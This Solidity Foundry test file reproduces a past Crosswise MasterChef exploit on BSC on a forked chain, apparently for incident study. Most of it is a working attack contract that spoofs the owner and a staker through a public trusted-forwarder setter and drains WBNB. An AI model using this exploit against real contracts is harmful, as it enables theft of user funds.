// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 4.16 WBNB
// Attacker : 0xc49f2938327aA2cDc3F2f89Ed17B54b3671F05dE
// Attack Contract : 0xafc88CaB578Af298BA412376C34B43F6392E939a
// Vulnerable Contract : 0x70873211CB64c1D4EC027Ea63a399A7D07c4085B
// Attack Tx : https://bscscan.com/tx/0xfe88443d73e8ae6d4799c4d3cc42488730c084624fd2daa5f035c1ad2927ea0f
//
// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x70873211CB64c1D4EC027Ea63a399A7D07c4085B#code
//
// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/1002
//
// Attack summary: The attacker set itself as MasterChef's trusted forwarder, spoofed the owner to
// set pool 0's deposit fee to 100%, spoofed an approved staker to deposit CRSS, and routed the fee
// into the CRSS/WBNB pair before swapping out WBNB.
// Root cause: MasterChef's public setTrustedForwarder lets any caller become the trusted forwarder
// for calldata-suffix based _msgSender() spoofing.

address constant ATTACKER = 0xc49F2938327aa2cDc3F2f89Ed17b54B3671F05DE;
address constant TRACE_ATTACK_CONTRACT = 0xafc88CaB578AF298Ba412376c34b43f6392e939a;
address constant MASTER_CHEF = 0x70873211CB64c1D4EC027Ea63A399A7d07c4085B;
address constant CRSS_TOKEN = 0x99FEFBC5cA74cc740395D65D384EDD52Cb3088Bb;
address constant CRSS_WBNB_PAIR = 0xb5d85cA38a9CbE63156a02650884D92A6e736DDC;
address constant WBNB_TOKEN = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
address constant SPOOFED_STAKER = 0xfD3002cE12D81c4e5F62B97F3c72f18122291A65;
string constant DEFAULT_BSC_RPC_URL = "https://bsc-mainnet.public.blastapi.io";

interface ICrssToken {
    function balanceOf(
        address account
    ) external view returns (uint256);
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);
}

interface ICrosswiseMasterChef {
    function owner() external view returns (address);
    function trustedForwarder() external view returns (address);
    function devAddress() external view returns (address);
    function treasuryAddress() external view returns (address);
    function setTrustedForwarder(
        address trustedForwarder
    ) external;
    function set(uint256 pid, uint256 allocPoint, uint256 depositFeeBP, address strategy, bool withUpdate) external;
    function updatePool(
        uint256 pid
    ) external;
    function setDevAddress(
        address devAddress
    ) external;
    function setTreasuryAddress(
        address treasuryAddress
    ) external;
    function userInfo(
        uint256 pid,
        address user
    ) external view returns (uint256 amount, uint256 rewardDebt, uint256 crssRewardLockedUp, bool isVest, bool isAuto);
    function deposit(uint256 pid, uint256 amount, address referrer, bool isVest, bool isAuto) external;
}

interface ICrosswisePairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IWBNBLike {
    function balanceOf(
        address account
    ) external view returns (uint256);
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        vm.createSelectFork(vm.envOr("BSC_RPC_URL", DEFAULT_BSC_RPC_URL), 49_186_830);

        fundingToken = WBNB_TOKEN;
        attacker = address(this);

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(TRACE_ATTACK_CONTRACT, "Trace Attack Contract");
        vm.label(MASTER_CHEF, "Crosswise MasterChef");
        vm.label(CRSS_TOKEN, "CRSS");
        vm.label(CRSS_WBNB_PAIR, "CRSS/WBNB Pair");
        vm.label(WBNB_TOKEN, "WBNB");
        vm.label(SPOOFED_STAKER, "Spoofed Staker");
    }

    function testExploit() public balanceLog {
        assertEq(ICrosswisePairLike(CRSS_WBNB_PAIR).token0(), CRSS_TOKEN);
        assertEq(ICrosswisePairLike(CRSS_WBNB_PAIR).token1(), WBNB_TOKEN);
        assertEq(ICrosswiseMasterChef(MASTER_CHEF).trustedForwarder(), 0xCC6B00b966b0A903e1F73cbCd845A8618c9603Ba);

        uint256 stakerBalance = ICrssToken(CRSS_TOKEN).balanceOf(SPOOFED_STAKER);
        assertEq(stakerBalance, 10_320_972_557_081_805_631_006_556);
        assertGe(ICrssToken(CRSS_TOKEN).allowance(SPOOFED_STAKER, MASTER_CHEF), stakerBalance);

        (, uint112 wbnbReserveBefore,) = ICrosswisePairLike(CRSS_WBNB_PAIR).getReserves();
        assertEq(uint256(wbnbReserveBefore), 9_771_726_308_878_491_704);

        new CrosswiseTrustedForwarderAttack(address(this));

        uint256 profit = IWBNBLike(WBNB_TOKEN).balanceOf(address(this));
        assertEq(profit, 4_158_211_071_044_910_965);
        assertEq(IWBNBLike(WBNB_TOKEN).balanceOf(CRSS_WBNB_PAIR), 5_613_515_237_833_580_739);
    }
}

contract CrosswiseTrustedForwarderAttack {
    address private immutable profitReceiver;

    constructor(
        address _profitReceiver
    ) {
        profitReceiver = _profitReceiver;

        ICrosswiseMasterChef masterChef = ICrosswiseMasterChef(MASTER_CHEF);
        ICrssToken crss = ICrssToken(CRSS_TOKEN);

        address realOwner = masterChef.owner();
        masterChef.setTrustedForwarder(address(this));

        _callAs(
            realOwner,
            abi.encodeWithSelector(
                ICrosswiseMasterChef.set.selector, uint256(0), uint256(0), uint256(10_000), address(0), false
            )
        );

        masterChef.updatePool(0);

        address dev = masterChef.devAddress();
        _callAs(dev, abi.encodeWithSelector(ICrosswiseMasterChef.setDevAddress.selector, dev));

        address treasury = masterChef.treasuryAddress();
        _callAs(treasury, abi.encodeWithSelector(ICrosswiseMasterChef.setTreasuryAddress.selector, treasury));

        masterChef.userInfo(0, SPOOFED_STAKER);

        uint256 stakerBalance = crss.balanceOf(SPOOFED_STAKER);
        _callAs(
            SPOOFED_STAKER,
            abi.encodeWithSelector(
                ICrosswiseMasterChef.deposit.selector, uint256(0), stakerBalance, address(0), false, false
            )
        );

        ICrosswisePairLike pair = ICrosswisePairLike(CRSS_WBNB_PAIR);
        (uint112 reserve0, uint112 reserve1,) = pair.getReserves();
        uint256 crssInput = crss.balanceOf(CRSS_WBNB_PAIR) - uint256(reserve0);
        uint256 amountOut = _crosswiseAmountOut(crssInput, reserve0, reserve1);

        pair.swap(0, amountOut, profitReceiver, "");
    }

    function _callAs(address spoofedSender, bytes memory data) private {
        (bool ok,) = MASTER_CHEF.call(bytes.concat(data, bytes20(spoofedSender)));
        require(ok, "spoofed call failed");
    }

    function _crosswiseAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) private pure returns (uint256) {
        uint256 amountInWithFee = amountIn * 998;
        return amountInWithFee * reserveOut / (reserveIn * 1000 + amountInWithFee);
    }
}
